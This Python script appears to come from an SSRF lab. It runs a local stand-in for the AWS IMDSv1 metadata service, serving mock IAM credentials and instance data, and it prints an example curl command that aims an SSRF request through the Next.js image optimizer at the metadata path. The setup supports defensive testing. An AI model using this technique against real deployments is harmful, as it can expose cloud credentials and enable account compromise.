#!/usr/bin/env python3
"""
AWS IMDSv1 Simulator
====================

Simulates AWS EC2 Instance Metadata Service Version 1 (IMDSv1).
IMDSv1 is still enabled on many legacy EC2 instances and is vulnerable
to SSRF attacks because it requires no authentication tokens.

This is a REALISTIC attack target. The returned data is plain text,
which Next.js image optimizer will reject as "not a valid image".

However, this demonstrates the SSRF can reach the metadata endpoint.
The status code (200 vs 404) reveals information about the target.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler

# Simulated AWS IAM credentials (for demonstration)
MOCK_CREDENTIALS = {
    "Code": "Success",
    "LastUpdated": "2024-01-01T00:00:00Z",
    "Type": "AWS-HMAC",
    "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "Token": "FwoGZXIvYXdzEBYaDH...truncated",
    "Expiration": "2024-12-31T23:59:59Z"
}

# Simulated metadata responses
METADATA = {
    '/latest/meta-data/': 'ami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/\nhostname\niam/\ninstance-action\ninstance-id\ninstance-life-cycle\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nnetwork/\nplacement/\nprofile\npublic-hostname\npublic-ipv4\npublic-keys/\nreservation-id\nsecurity-groups',
    '/latest/meta-data/iam/': 'info\nsecurity-credentials/',
    '/latest/meta-data/iam/security-credentials/': 'ec2-role',
    '/latest/meta-data/iam/security-credentials/ec2-role': str(MOCK_CREDENTIALS),
    '/latest/meta-data/instance-id': 'i-1234567890abcdef0',
    '/latest/meta-data/local-ipv4': '10.0.0.5',
    '/latest/meta-data/public-ipv4': '54.123.45.67',
    '/latest/meta-data/hostname': 'ip-10-0-0-5.ec2.internal',
    '/latest/dynamic/instance-identity/document': '{"accountId": "123456789012", "instanceId": "i-1234567890abcdef0", "region": "us-east-1"}',
}

class IMDSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"\n[IMDS] Request: {self.path}")
        
        if self.path in METADATA:
            response = METADATA[self.path].encode('utf-8')
            print(f"[IMDS] Returning: {response[:100]}...")
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Content-Length', len(response))
            self.end_headers()
            self.wfile.write(response)
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    # AWS IMDS runs on 169.254.169.254, but for testing we use 127.0.0.1:9169
    port = 9169
    print("=" * 60)
    print(" AWS IMDSv1 Simulator")
    print("=" * 60)
    print(f"\nSimulating at 127.0.0.1:{port}")
    print(f"(Real AWS IMDS is at 169.254.169.254)")
    print("\nEndpoints:")
    print("  /latest/meta-data/")
    print("  /latest/meta-data/iam/security-credentials/ec2-role")
    print("=" * 60)
    print("\nTest SSRF (will fail due to text content, but status code leaks):")
    print(f'  curl "http://localhost:3000/_next/image?url=http://127.0.0.1:{port}/latest/meta-data/&w=64&q=75"')
    print("=" * 60)
    
    HTTPServer(('127.0.0.1', port), IMDSHandler).serve_forever()
